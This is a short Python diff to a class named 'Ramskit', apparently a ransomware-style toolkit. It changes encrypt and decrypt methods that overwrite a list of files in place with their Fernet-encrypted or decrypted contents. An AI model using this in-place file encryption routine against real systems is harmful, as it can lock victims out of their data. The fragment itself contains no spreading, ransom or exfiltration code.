@@ -35,24 +35,24 @@ class Ramskit:
         print(f"[x] Key is {self.key}")
 
     def encrypt_file(self, items, key):
-        f = Fernet(self.key)
+        f = Fernet(key)
         for item in items:
             with open(item, 'rb') as file:
                 data = file.read()
 
-            fernet = Fernet(self.key)
+            fernet = Fernet(key)
             encrypted = fernet.encrypt(data)
 
             with open(item, 'wb') as file:
                 file.write(encrypted)
 
     def decrypt_file(self, items, key):
-        f = Fernet(self.key)
+        f = Fernet(key)
         for item in items:
             with open(item, 'rb') as file:
                 data = file.read()
 
-            fernet = Fernet(self.key)
+            fernet = Fernet(key)
             decrypted = fernet.decrypt(data)
 
             with open(item, 'wb') as file:
